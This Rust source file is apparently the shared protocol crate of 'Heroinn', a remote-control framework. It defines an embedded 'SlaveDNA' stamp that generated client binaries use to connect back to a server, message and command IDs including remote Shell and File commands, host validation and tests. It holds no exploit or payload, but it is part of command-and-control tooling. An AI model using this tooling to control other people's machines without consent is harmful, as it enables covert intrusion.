//! Foundations shared by the Heroinn server, client and worker binaries.
//!
//! This crate owns the wire protocol: the [`SlaveDNA`] connection stamp, the
//! message/command id mappings, the packet (de)serialization helpers and the
//! TCP/WebSocket/UDP transports built on top of them. Every byte layout here is
//! load-bearing for interoperability, so protocol changes must stay additive.

use std::io::{BufWriter, Cursor, Read, Write};
use std::net::{IpAddr, Ipv6Addr};

use dna::CONNECTION_INFO_FLAG;
use serde::{Deserialize, Serialize};

pub mod dna;
pub mod error;
pub mod ftp;
pub mod packet;
pub mod protocol;
pub mod rpc;
pub mod session;
pub mod transfer_rate;

pub use error::{Error, Result};
pub use transfer_rate::{
    DEFAULT_TRANSFER_RATE, TransferRateUnit, format_transfer_rate_input, parse_transfer_rate,
};

/// Interval, in seconds, between client heartbeats.
pub const HEART_BEAT_TIME: u64 = 5;

/// Maximum JSON payload size carried inside a [`SlaveDNA`] connection stamp.
pub const CONNECTION_INFO_DATA_LEN: usize = 1024;

/// Serialized size of a [`SlaveDNA`]: flag, big-endian length and payload.
pub const SLAVE_DNA_LEN: usize = 16 + CONNECTION_INFO_DATA_LEN;

/// Connection stamp embedded into every generated `heroinn_client` binary.
///
/// The generator rewrites this fixed-size region in-place inside the executable
/// so the client learns where to dial home. `#[repr(align(1))]` keeps the
/// on-disk image byte-exact.
#[derive(Debug, Clone, Copy)]
#[repr(C, align(1))]
pub struct SlaveDNA {
    pub flag: [u8; 8],
    pub size: [u8; 8],
    pub data: [u8; CONNECTION_INFO_DATA_LEN],
}

impl SlaveDNA {
    /// Build a stamp carrying `data`, which must fit in 1024 bytes.
    pub fn new(data: &[u8]) -> Result<Self> {
        if data.len() > CONNECTION_INFO_DATA_LEN {
            return Err(Error::PacketTooLarge(data.len()));
        }

        let mut buf = [0u8; CONNECTION_INFO_DATA_LEN];
        buf[..data.len()].copy_from_slice(data);

        Ok(Self {
            flag: CONNECTION_INFO_FLAG,
            size: (data.len() as u64).to_be_bytes(),
            data: buf,
        })
    }

    /// Parse a stamp from its serialized form.
    pub fn parse(data: &[u8]) -> Result<Self> {
        let mut reader = Cursor::new(data);
        let mut flag = [0u8; 8];
        reader.read_exact(&mut flag)?;

        let mut size = [0u8; 8];
        reader.read_exact(&mut size)?;

        let mut data = [0u8; CONNECTION_INFO_DATA_LEN];
        reader.read_exact(&mut data)?;

        if flag != CONNECTION_INFO_FLAG {
            return Err(Error::Malformed("invalid connection info flag"));
        }

        let payload_len = u64::from_be_bytes(size);
        if payload_len > CONNECTION_INFO_DATA_LEN as u64 {
            return Err(Error::PacketTooLarge(payload_len as usize));
        }

        Ok(Self { flag, size, data })
    }

    /// Return the decoded JSON payload.
    pub fn payload(&self) -> Result<&[u8]> {
        let size = u64::from_be_bytes(self.size);
        if size > CONNECTION_INFO_DATA_LEN as u64 {
            return Err(Error::PacketTooLarge(size as usize));
        }

        Ok(&self.data[..size as usize])
    }

    /// Serialize the stamp into its 1040-byte on-disk representation.
    pub fn serialize(&self) -> Vec<u8> {
        let mut ret = vec![];

        let mut writer = BufWriter::new(&mut ret);
        writer.write_all(&self.flag).unwrap();
        writer.write_all(&self.size).unwrap();
        writer.write_all(&self.data).unwrap();
        drop(writer);

        ret
    }
}

/// Location and label a generated client should connect back to.
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct ConnectionInfo {
    pub protocol: u8,
    pub address: String,
    pub remark: String,
}

impl ConnectionInfo {
    /// Validate and build the connection information shown in the generator.
    pub fn new(protocol: HeroinnProtocol, host: &str, port: &str, remark: &str) -> Result<Self> {
        let host = host.trim();
        if host.is_empty() {
            return Err(Error::Other("address is required".to_string()));
        }

        let port: u16 = port
            .trim()
            .parse()
            .map_err(|_| Error::Other("port must be an integer between 1 and 65535".to_string()))?;
        if port == 0 {
            return Err(Error::Other("port must be between 1 and 65535".to_string()));
        }

        let info = Self {
            protocol: protocol.to_u8(),
            address: format!("{}:{}", normalize_host(host)?, port),
            remark: remark.trim().to_string(),
        };

        let payload_len = info.serialize()?.len();
        if payload_len > CONNECTION_INFO_DATA_LEN {
            return Err(Error::PacketTooLarge(payload_len));
        }

        Ok(info)
    }

    pub fn parse(data: &[u8]) -> Result<Self> {
        Ok(serde_json::from_slice(data)?)
    }

    pub fn serialize(&self) -> Result<Vec<u8>> {
        Ok(serde_json::to_vec(self)?)
    }
}

fn normalize_host(host: &str) -> Result<String> {
    if let Ok(ip) = host.parse::<IpAddr>() {
        return Ok(match ip {
            IpAddr::V4(_) => ip.to_string(),
            IpAddr::V6(_) => format!("[{}]", ip),
        });
    }

    if let Some(inner) = host.strip_prefix('[').and_then(|h| h.strip_suffix(']')) {
        let ip = inner
            .parse::<Ipv6Addr>()
            .map_err(|_| Error::Other("invalid bracketed IPv6 address".to_string()))?;
        return Ok(format!("[{}]", ip));
    }

    if host.contains(':') {
        return Err(Error::Other(
            "address must not include a port; enter the port separately".to_string(),
        ));
    }

    if host.len() > 253 {
        return Err(Error::Other("address is too long".to_string()));
    }

    for label in host.split('.') {
        let valid = !label.is_empty()
            && label.len() <= 63
            && !label.starts_with('-')
            && !label.ends_with('-')
            && label
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
        if !valid {
            return Err(Error::Other("address is not a valid host name".to_string()));
        }
    }

    Ok(host.to_string())
}

#[cfg(test)]
mod connection_info_tests {
    use super::*;

    #[test]
    fn builds_normalized_connection_addresses() {
        assert_eq!(
            ConnectionInfo::new(HeroinnProtocol::TCP, " 127.0.0.1 ", " 9001 ", " debug ").unwrap(),
            ConnectionInfo {
                protocol: 0,
                address: "127.0.0.1:9001".to_string(),
                remark: "debug".to_string(),
            }
        );

        assert_eq!(
            ConnectionInfo::new(HeroinnProtocol::HTTP, "example.com", "443", "")
                .unwrap()
                .address,
            "example.com:443"
        );
        assert_eq!(
            ConnectionInfo::new(HeroinnProtocol::UDP, "::1", "8000", "v6")
                .unwrap()
                .address,
            "[::1]:8000"
        );
        assert_eq!(
            ConnectionInfo::new(HeroinnProtocol::UDP, "[::1]", "8000", "v6")
                .unwrap()
                .address,
            "[::1]:8000"
        );
    }

    #[test]
    fn rejects_invalid_addresses_and_ports() {
        for (host, port) in [
            ("", "9001"),
            ("example.com", "0"),
            ("example.com", "65536"),
            ("example.com", "not-a-port"),
            ("example.com:9001", "9001"),
            ("bad host", "9001"),
            ("-bad.example", "9001"),
            ("[not-ipv6]", "9001"),
        ] {
            assert!(
                ConnectionInfo::new(HeroinnProtocol::TCP, host, port, "").is_err(),
                "{host}:{port} should be rejected"
            );
        }
    }

    #[test]
    fn rejects_connection_info_larger_than_stamp() {
        let remark = "x".repeat(CONNECTION_INFO_DATA_LEN);
        let err =
            ConnectionInfo::new(HeroinnProtocol::TCP, "127.0.0.1", "9001", &remark).unwrap_err();
        assert!(matches!(err, Error::PacketTooLarge(_)));
    }

    #[test]
    fn slave_dna_layout_is_fixed() {
        assert_eq!(std::mem::size_of::<SlaveDNA>(), SLAVE_DNA_LEN);

        let stamp = SlaveDNA::new(b"test").unwrap().serialize();
        assert_eq!(stamp.len(), SLAVE_DNA_LEN);
        assert_eq!(&stamp[..8], &CONNECTION_INFO_FLAG);
        assert_eq!(&stamp[8..16], &4u64.to_be_bytes());
        assert_eq!(&stamp[16..20], b"test");
        assert!(stamp[20..].iter().all(|byte| *byte == 0));
    }
}

/// Messages a client sends up to the server.
#[derive(Debug, PartialEq, Eq)]
pub enum HeroinnClientMsgID {
    HostInfo,
    Heartbeat,
    SessionPacket,
}

impl From<HeroinnClientMsgID> for u8 {
    fn from(id: HeroinnClientMsgID) -> Self {
        match id {
            HeroinnClientMsgID::HostInfo => 0x00,
            HeroinnClientMsgID::Heartbeat => 0x01,
            HeroinnClientMsgID::SessionPacket => 0x02,
        }
    }
}

impl TryFrom<u8> for HeroinnClientMsgID {
    type Error = Error;

    fn try_from(v: u8) -> Result<Self> {
        match v {
            0x00 => Ok(HeroinnClientMsgID::HostInfo),
            0x01 => Ok(HeroinnClientMsgID::Heartbeat),
            0x02 => Ok(HeroinnClientMsgID::SessionPacket),
            other => Err(Error::UnknownMessageId(other)),
        }
    }
}

impl HeroinnClientMsgID {
    /// Byte value written on the wire.
    pub fn to_u8(&self) -> u8 {
        match self {
            HeroinnClientMsgID::HostInfo => 0x00,
            HeroinnClientMsgID::Heartbeat => 0x01,
            HeroinnClientMsgID::SessionPacket => 0x02,
        }
    }
}

/// Commands the server pushes down to a client.
#[derive(Debug, PartialEq, Eq)]
pub enum HeroinnServerCommandID {
    Shell,
    File,
    SessionPacket,
    SetTransferRate,
}

impl From<HeroinnServerCommandID> for u8 {
    fn from(id: HeroinnServerCommandID) -> Self {
        match id {
            HeroinnServerCommandID::Shell => 0x00,
            HeroinnServerCommandID::File => 0x01,
            HeroinnServerCommandID::SessionPacket => 0x02,
            HeroinnServerCommandID::SetTransferRate => 0x03,
        }
    }
}

impl TryFrom<u8> for HeroinnServerCommandID {
    type Error = Error;

    fn try_from(v: u8) -> Result<Self> {
        match v {
            0x00 => Ok(HeroinnServerCommandID::Shell),
            0x01 => Ok(HeroinnServerCommandID::File),
            0x02 => Ok(HeroinnServerCommandID::SessionPacket),
            0x03 => Ok(HeroinnServerCommandID::SetTransferRate),
            other => Err(Error::UnknownMessageId(other)),
        }
    }
}

impl HeroinnServerCommandID {
    /// Byte value written on the wire.
    pub fn to_u8(&self) -> u8 {
        match self {
            HeroinnServerCommandID::Shell => 0x00,
            HeroinnServerCommandID::File => 0x01,
            HeroinnServerCommandID::SessionPacket => 0x02,
            HeroinnServerCommandID::SetTransferRate => 0x03,
        }
    }
}

#[cfg(test)]
mod server_command_tests {
    use super::*;

    #[test]
    fn transfer_rate_command_uses_additive_id() {
        assert_eq!(HeroinnServerCommandID::SetTransferRate.to_u8(), 0x03);
        assert_eq!(
            HeroinnServerCommandID::try_from(0x03).unwrap(),
            HeroinnServerCommandID::SetTransferRate
        );
    }
}

/// Transport a listener or client speaks.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HeroinnProtocol {
    TCP,
    HTTP,
    UDP,
}

impl From<HeroinnProtocol> for u8 {
    fn from(proto: HeroinnProtocol) -> Self {
        match proto {
            HeroinnProtocol::TCP => 0x00,
            HeroinnProtocol::HTTP => 0x01,
            HeroinnProtocol::UDP => 0x02,
        }
    }
}

impl TryFrom<u8> for HeroinnProtocol {
    type Error = Error;

    fn try_from(v: u8) -> Result<Self> {
        match v {
            0x00 => Ok(HeroinnProtocol::TCP),
            0x01 => Ok(HeroinnProtocol::HTTP),
            0x02 => Ok(HeroinnProtocol::UDP),
            other => Err(Error::UnknownProtocol(other)),
        }
    }
}

impl HeroinnProtocol {
    /// Byte value written on the wire.
    pub fn to_u8(&self) -> u8 {
        self.clone().into()
    }
}

/// Current wall-clock time in milliseconds since the Unix epoch.
pub fn cur_timestamp_millis() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis()
}

/// Current wall-clock time in seconds since the Unix epoch.
pub fn cur_timestamp_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}
